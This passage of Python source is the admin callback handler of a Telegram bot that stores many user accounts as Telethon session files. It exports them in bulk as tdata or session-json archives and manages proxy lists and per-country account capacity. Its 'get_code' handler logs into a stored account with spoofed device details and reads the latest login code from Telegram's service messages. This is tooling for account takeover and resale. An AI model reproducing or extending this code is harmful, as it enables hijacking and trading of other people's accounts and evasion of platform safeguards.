            cursor.execute("UPDATE `users` SET `status` = 1 WHERE `from_id` = %s", (user_chat_id, ))
            db.commit()
            await event.answer(message='✅ The user account has been successfully unblocked.', alert=True)
        
        elif 'block_user-' in data.decode():
            user_chat_id = str(data.decode()).split('-')[1]
            cursor.execute("UPDATE `users` SET `status` = 0 WHERE `from_id` = %s", (user_chat_id, ))
            db.commit()
            await event.answer(message='✅ The user account has been successfully blocked.', alert=True)
        
        elif 'send_msg_to_user' in data.decode():
            user_chat_id = str(data.decode()).split('-')[1]
            await step('send_text_for_send-' + user_chat_id, chat_id)
            await app.send_message(entity=chat_id, message=f'💬 Send message: [ <code>{user_chat_id}</code> ]:', buttons=back_to_panel)
        
        elif 'view_acc' in data.decode():
            page = int(str(data.decode()).split('-')[1])
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            response = await get_accounts_key(page=page)
            if response != False:
                stat = await get_bot_stat()
                await app.edit_message(entity=chat_id, message=message_id, text=f"📞 Welcome to the account management section.\n\n◽️Total accounts: {stat['all_accounts']}\n◽️Confirmed accounts: {stat['confirmed_accounts']}\n◽️Unconfirmed accounts: {stat['unconfirmed_accounts']}\n\n🔽 Choose one of the following options:", buttons=response)
            else:
                await app.edit_message(entity=chat_id, message=message_id, text=f'⚠️ There is no account in the bot!')
        
        elif 'delete_account_from_bot' in data.decode():
            row = str(data.decode()).split('-')[1]
            cursor.execute("SELECT * FROM `accounts` WHERE `row` = %s", (row, ))
            if cursor.rowcount > 0:
                try:
                    response = cursor.fetchone()
                    
                    if os.path.exists(f'sessions/{response[3]}.session'):
                        os.remove(f'sessions/{response[3]}.session')
                    if os.path.exists(f'sessions/{response[3]}.json'):
                        os.remove(f'sessions/{response[3]}.json')
                    
                    cursor.execute("DELETE FROM `accounts` WHERE `number` = %s", (response[3], ))
                    db.commit()
                    
                    await app.delete_messages(entity=chat_id, message_ids=message_id)
                    await app.send_message(entity=chat_id, message=f'🗑 <b>Your selected account has been successfully deleted from the bot database.</b>\n\n📞 Phone: <code>{response[3]}</code>\n\n⏱ <code>{date} - {time}</code>')
                except Exception as e:
                    print(f'[-] Error: {e}')
                    await event.answer(message='⚠️ The account deletion operation encountered an error.', alert=True)    
            else:
                await event.answer(message='⚠️ Account not find.', alert=True)
        
        elif 'get_code' in data.decode():
            row = str(data.decode()).split('-')[1]
            cursor.execute("SELECT * FROM `accounts` WHERE `row` = %s", (row, ))
            if cursor.rowcount > 0:
                wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>')
                response = cursor.fetchone()
                
                if os.path.exists(f'sessions/{response[3]}.json'):
                    json_data = json.load(open(f'sessions/{response[3]}.json', 'r'))
                    
                    account = TelegramClient(session=f'sessions/{response[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'])
                    
                    account._init_connection = functions.InitConnectionRequest(
                        api_id=json_data['app_id'],
                        device_model=json_data.get('system_version', json_data['app_version']),
                        system_version=json_data['sdk'],
                        app_version=json_data['app_version'],
                        system_lang_code='en',
                        lang_pack=None,
                        lang_code='en',
                        query=None,
                        proxy=None,
                        params=types.JsonNull()
                    )
                    
                    try:
                        res = await account.connect()
                        me = await account.get_me()
                        code = 'Not found'
                        async for item in account.iter_messages(entity=777000):
                            if 'Login code' in item.message or 'کد احراز هویت شما' in item.message:
                                match = re.search(r'\b\d{5}\b', str(item.message))
                                code = str(match.group())
                                break
                            
                            if 'Web login code' in item.message:
                                match = re.search(r'\b[A-Za-z0-9-]{11}\b', str(item.message))
                                code = str(match.group())
                                break
                            
                        await app.edit_message(entity=chat_id, message=wait.id, text=f"<b>✅ Information received successfully.</b>\n\n◽️First name: <b>{me.first_name}</b>\n◽️Username: {'None' if me.username is None else '@' + str(me.username)}\n◽️Phone: <code>{response[3]}</code>\n◽️Last code: <code>{code}</code>\n\n⏱ <code>{date} - {time}</code>", buttons=delete_message)
                        await account.disconnect()
                    except Exception as e:
                        print(f'[-] Error: {e}')
                        await app.edit_message(entity=chat_id, message=wait.id, text=f"<b>⚠️ Session problem!</b>\n\n<b>🚫 ERROR:</b> <code>{e}</code>", buttons=delete_message)
                else:
                    await app.edit_message(entity=chat_id, message=wait.id, text=f"<b>⚠️ File not exists!</b>", buttons=delete_message)
            else:
                await event.answer(message='⚠️ Account not find.', alert=True)
        
        elif data.decode() == 'receive_accounts_as_tdata':
            await event.answer(message='⏱ Please wait a few second ...', alert=False)
            await zip_folder(folder='sessions', save='accounts(tdata).zip', allow=['session', 'json'])
            await app.send_file(entity=chat_id, file='accounts(tdata).zip', caption=f'✅ All accounts submited in the bot!\n\n<b>🔑 Type: </b><code>t-data</code>\n\n⏱ <code>{date} - {time}</code>', buttons=agree_del_accounts)
            os.remove('accounts(tdata).zip')
        
        elif data.decode() == 'receive_accounts_with_json':
            await event.answer(message='⏱ Please wait a few second ...', alert=False)
            await zip_folder(folder='sessions', save='accounts(sessions-json).zip', allow=['session', 'json'])
            await app.send_file(entity=chat_id, file='accounts(sessions-json).zip', caption=f'✅ All accounts submited in the bot!\n\n<b>🔑 Type: </b><code>session-json</code>\n\n⏱ <code>{date} - {time}</code>', buttons=agree_del_accounts)
            os.remove('accounts(sessions-json).zip')
        
        elif data.decode() == 'receive_accounts_without_json':
            await event.answer(message='⏱ Please wait a few second ...', alert=False)
            await zip_folder(folder='sessions', save='accounts(session).zip', allow=['session'])
            await app.send_file(entity=chat_id, file='accounts(session).zip', caption=f'✅ All accounts registered in the bot!\n\n<b>🔑 Type: </b><code>session</code>\n\n⏱ <code>{date} - {time}</code>', buttons=agree_del_accounts)
            os.remove('accounts(session).zip')
        
        elif data.decode() == 'add_sessionjson_to_bot':
            await step('send_zip_file_for_add', chat_id)
            await app.delete_messages(entity=chat_id, message_ids=[message_id])
            await app.send_message(entity=chat_id, message='📁 Send the file (zip):', buttons=back_to_panel)
        
        elif data.decode() == 'agree_delete_accounts':
            await event.answer(message='⏱ Please wait a few second ...', alert=False)
            await delete_accounts()
            await app.send_message(entity=chat_id, message=f'<b>✅ Deleted!</b>\n\n⏱ <code>{date} - {time}</code>')
            
        elif data.decode() == 'back_to_manage_channels':
            await step('none', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            await app.edit_message(entity=chat_id, message=message_id, text='📢 Welcome to the <b>channels</b> management section.\n\n🔽 Choose one of the following options:', buttons=manage_channels)
        
        elif data.decode() == 'view_all_channels':
            response = await view_all_channels()
            if response != False:
                await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
                await app.edit_message(entity=chat_id, message=message_id, text='📢 The list of all channels added by you is as follows:', buttons=response)
            else:
                await event.answer(message='⚠️ No channel found!', alert=True)
        
        elif 'change_channel_status' in data.decode():
            row = data.decode().split('-')[1]
            cursor.execute("SELECT * FROM `channels` WHERE `row` = %s", (row, ))
            response = cursor.fetchone()
            if response[2] == True:
                cursor.execute("UPDATE `channels` SET `status` = %s WHERE `row` = %s", (False, row))
                db.commit()
            elif response[2] == False:
                cursor.execute("UPDATE `channels` SET `status` = %s WHERE `row` = %s", (True, row))
                db.commit()
            response = await view_all_channels()
            if response != False:
                await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
                await app.edit_message(entity=chat_id, message=message_id, text='📢 The list of all channels added by you is as follows:', buttons=response)
            else:
                await event.answer(message='⚠️ No channel found!', alert=True)
        
        elif data.decode() == 'add_channel':
            await step('send_channel_username_for_add', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text="<b>🆔 Send channel username with '@':</b>", buttons=back_to_manage_channels)
        
        elif data.decode() == 'remove_channel':
            await step('send_channel_username_for_remove', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text="<b>🆔 Send channel username with '@':</b>", buttons=back_to_manage_channels)
        
        elif data.decode() == 'back_to_manage_admins':
            await step('none', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            await app.edit_message(entity=chat_id, message=message_id, text='👮‍♀ Welcome to the <b>admins</b> management section.\n\n🔽 Choose one of the following options:', buttons=manage_admins)
        
        elif data.decode() == 'view_all_admins':
            response = await view_all_admins()
            if response != False:
                await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
                await app.edit_message(entity=chat_id, message=message_id, text='👮‍♀ The list of all admins added by you is as follows:', buttons=response)
            else:
                await event.answer(message='⚠️ No admin found!', alert=True)
        
        elif 'change_admin_status' in data.decode():
            row = data.decode().split('-')[1]
            cursor.execute("SELECT * FROM `admins` WHERE `row` = %s", (row, ))
            response = cursor.fetchone()
            if response[4] == True:
                cursor.execute("UPDATE `admins` SET `status` = %s WHERE `row` = %s", (False, row))
                db.commit()
            elif response[4] == False:
                cursor.execute("UPDATE `admins` SET `status` = %s WHERE `row` = %s", (True, row))
                db.commit()
            response = await view_all_admins()
            if response != False:
                await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
                await app.edit_message(entity=chat_id, message=message_id, text='👮‍♀ The list of all admins added by you is as follows:', buttons=response)
            else:
                await event.answer(message='⚠️ No channel found!', alert=True)
        
        elif data.decode() == 'add_admin':
            await step('send_chat_id_for_addadmin', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text="<b>🆔 Send the numerical ID of the desired person:</b>", buttons=back_to_manage_admins)
        
        elif data.decode() == 'remove_admin':
            await step('send_chat_id_for_remadmin', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text="<b>🆔 Send the numerical ID of the desired person:</b>", buttons=back_to_manage_admins)
        
        elif data.decode() == 'back_to_manage_proxies':
            await step('none', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            cursor.execute("SELECT * FROM `proxies`")
            await app.edit_message(entity=chat_id, message=message_id, text=f'🛡 Welcome to the <b>proxy</b> management section.\n\n🔢 Total number of current bot proxies: {cursor.rowcount}', buttons=manage_proxies)
        
        elif data.decode() == 'add_proxy':
            await step('send_proxy_file', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='📁 Please send the file containing the proxy :\n\n⚠️ Note that the file extension must be .txt and also the proxies in the file must be in this format:\n\nip1:port1:username1:password1\nip2:port2:username2:password2', buttons=back_to_manage_proxies)
        
        elif data.decode() == 'remove_proxy':
            await step('none', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            cursor.execute("DELETE FROM `proxies`")
            db.commit()
            await event.answer(message='🗑 All proxies deleted!', alert=False)
            cursor.execute("SELECT * FROM `proxies`")
            await app.edit_message(entity=chat_id, message=message_id, text=f'🛡 Welcome to the <b>proxy</b> management section.\n\n🔢 Total number of current bot proxies: {cursor.rowcount}', buttons=manage_proxies)
        
        if data.decode() == 'back_to_manage_country':
            await step('none', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            cursor.execute("SELECT * FROM `open_country`")
            count_open = cursor.rowcount
            cursor.execute("SELECT * FROM `close_country`")
            count_close = cursor.rowcount
            if os.path.exists(path='open_country.txt'):
                os.remove(path='open_country.txt')
            await app.edit_message(entity=chat_id, message=message_id, text=f'🌍 Welcome to the <b>capacity/country</b> management section.\n\n🔢 Total number of current open countries: {count_open}\n🔢 Total number of current close countries: {count_close}', buttons=manage_countries)
        
        elif data.decode() == 'view_open_countries':
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            response = await view_open_countries()
            if response != False:
                await app.edit_message(entity=chat_id, message=message_id, text='🌍 The list of countries opened by you is as follows: \n\n🔄 By clicking on the status of each country, you can change its status!', buttons=response)
            else:
                await app.edit_message(entity=chat_id, message=message_id, text='⚠️ No country found!', buttons=manage_countries)
        
        elif 'change_open_country_status' in data.decode():
            await app.edit_message(entity=chat_id, message=message_id, text='<b>⏱ Please wait a few second ...</b>')
            row = str(data.decode()).split('-')[1]
            cursor.execute("SELECT * FROM `open_country` WHERE `row` = %s", (row, ))
            if cursor.rowcount > 0:
                result = cursor.fetchone()
                if result[7] == True:
                    cursor.execute("UPDATE `open_country` SET `status` = %s WHERE `row` = %s", (0, row))
                    db.commit()
                elif result[7] == False:
                    cursor.execute("UPDATE `open_country` SET `status` = %s WHERE `row` = %s", (1, row))
                    db.commit()
                
                response = await view_open_countries()
                if response != False:
                    await app.edit_message(entity=chat_id, message=message_id, text='🌍 The list of countries opened by you is as follows: \n\n🔄 By clicking on the status of each country, you can change its status!', buttons=response)
                else:
                    await app.edit_message(entity=chat_id, message=message_id, text='🌍 The list of countries opened by you is as follows: \n\n🔄 By clicking on the status of each country, you can change its status!', buttons=manage_countries)
            else:
                response = await view_open_countries()
                if response != False:
                    await app.edit_message(entity=chat_id, message=message_id, text='⚠️ There was an error in changing the status of this country!', buttons=response)
                else:
                    await app.edit_message(entity=chat_id, message=message_id, text='⚠️ There was an error in changing the status of this country!', buttons=manage_countries)
        
        elif data.decode() == 'open_country':
            await step('send_country_name', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='📚 Send the name of the country:', buttons=back_to_manage_country)
        
        elif data.decode() == 'close_country':
            await step('send_country_code_delete', chat_id)
            await app.edit_message(entity=chat_id, message=message_id, text='🔢 Send the prefix of the country for delete: (e.x: +880)', buttons=back_to_manage_country)

app.start()
app.run_until_disconnected()